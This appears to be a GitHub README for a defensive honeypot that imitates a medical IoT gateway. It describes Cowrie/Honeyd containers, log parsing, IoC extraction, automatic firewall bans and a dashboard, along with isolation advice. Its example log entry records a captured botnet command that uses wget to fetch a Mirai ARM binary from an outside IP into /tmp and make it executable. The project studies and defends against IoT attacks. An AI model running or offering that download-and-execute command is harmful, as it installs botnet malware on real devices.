# Healthcare IoT Honeypot & Active IPS

An SSH/Telnet honeypot setup built to mimic an exposed medical IoT gateway, log automated botnet attacks, extract Indicators of Compromise (IoCs), and automatically ban repeat offenders at the host firewall.

I built this to study how opportunistic scanners and IoT botnets (like Mirai variants) fingerprint and exploit unpatched clinical devices—and to test automated containment rules without risking production infrastructure.

## How It Works

```text
Internet / Botnet Scanners
       │
       ▼  (SSH :2222 / Telnet :2223)
┌────────────────────────────────────────────────────────┐
│  AWS EC2 / Isolated Docker Network                     │
│                                                        │
│  Cowrie & Honeyd (Medical Gateway Simulation)          │
│   ├─ Custom HL7/DICOM banners & embedded Linux FS      │
│   └─ Records TTY sessions, credentials & dropped files │
└──────────────────────────┬─────────────────────────────┘
                           │ cowrie.json
                           ▼
┌────────────────────────────────────────────────────────┐
│  Python Log & IPS Pipeline (scripts/)                  │
│   ├─ log_parser.py    -> cleans logs & GeoIP lookup    │
│   ├─ ioc_extractor.py -> pulls hashes, URLs & commands │
│   └─ Active IPS       -> pushes bans to iptables/UFW   │
└──────────────────────────┬─────────────────────────────┘
                           │
                           ▼
                 Flask + D3.js Dashboard
```

1. **Deception Layer (`honeypot/`):** Runs Cowrie and Honeyd inside isolated Docker containers configured with embedded ARM/MIPS banners and a fake filesystem resembling a hospital telemetry gateway.
2. **Parsing & IoC Extraction (`scripts/`):** Python scripts ingest Cowrie's JSON event stream using `pandas`, enrich source IPs with ASN/GeoIP data, and pull out brute-force credential pairs, shell commands, and SHA-256 hashes of downloaded binaries.
3. **Active Containment:** When an IP crosses a failed-login threshold or attempts payload delivery, a cron-driven script appends a drop rule to `iptables`/`ufw` (skipping a hardcoded management whitelist so I don't lock myself out).
4. **Dashboard (`dashboard/`):** A lightweight Flask + D3.js app to inspect attack volume by country, most common default credentials, and executed shell payloads.

## Repo Layout

```text
├── honeypot/               # Dockerfiles, docker-compose.yml, Cowrie & Honeyd configs
├── scripts/
│   ├── log_parser.py       # Normalizes raw Cowrie JSON logs
│   ├── ioc_extractor.py    # Extracts IPs, URLs, commands, and file hashes
│   ├── geolocation.py      # ASN and country enrichment
│   └── setup.sh            # Host dependencies and initial firewall setup
├── dashboard/              # Flask backend and D3.js frontend
├── tests/                  # Pytest unit and pipeline integration tests
└── docs/                   # Network diagram, deployment notes, and attack analysis
```

## Running It Locally

1. **Clone and run setup:**
   ```bash
   git clone [https://github.com/kakarot2003/IoT-Honeypot-Network.git](https://github.com/kakarot2003/IoT-Honeypot-Network.git)
   cd IoT-Honeypot-Network
   chmod +x scripts/setup.sh
   ./scripts/setup.sh
   ```

2. **Start the honeypot containers:**
   ```bash
   docker compose -f honeypot/docker-compose.yml up -d
   ```

3. **Parse logs and launch the dashboard:**
   ```bash
   python3 scripts/log_parser.py --input honeypot/cowrie/var/log/cowrie/cowrie.json
   python3 scripts/ioc_extractor.py
   python3 dashboard/app.py
   ```
   Open `http://localhost:5000` in your browser.

## Example Parsed Event

Here is what a typical captured botnet session looks like after passing through `ioc_extractor.py`:

```json
{
  "timestamp": "2026-10-14T08:22:19Z",
  "src_ip": "185.220.101.42",
  "geo": { "country": "DE", "asn": "AS205100" },
  "protocol": "ssh",
  "auth_attempt": "root:admin123",
  "mitre_attack": ["T1110.001", "T1059.004"],
  "commands_executed": [
    "uname -m",
    "wget [http://198.51.100.14/bins/mirai.arm7](http://198.51.100.14/bins/mirai.arm7) -O /tmp/.init && chmod +x /tmp/.init"
  ],
  "payload_sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
  "ips_action": "BLOCKED_IPTABLES"
}
```

## Safety & Isolation Notes

If you deploy this on a public cloud VM (like AWS EC2), keep these guardrails in place:
- **Block outbound traffic:** Drop all egress traffic from the honeypot container subnet except DNS/NTP. Otherwise, an attacker who compromises the shell could use your VM as a DDoS reflector or pivot point.
- **Keep admin SSH separate:** Run your real SSH daemon on a non-standard port, bind it to a separate security group, and add your IP to the IPS whitelist before enabling automated firewall bans.
- **Run rootless:** Cowrie runs as a non-root user inside the container with read-only mounts everywhere outside the log and download directories.

## Tests

```bash
pytest tests/ -v
```

## License

MIT — see [LICENSE](LICENSE).
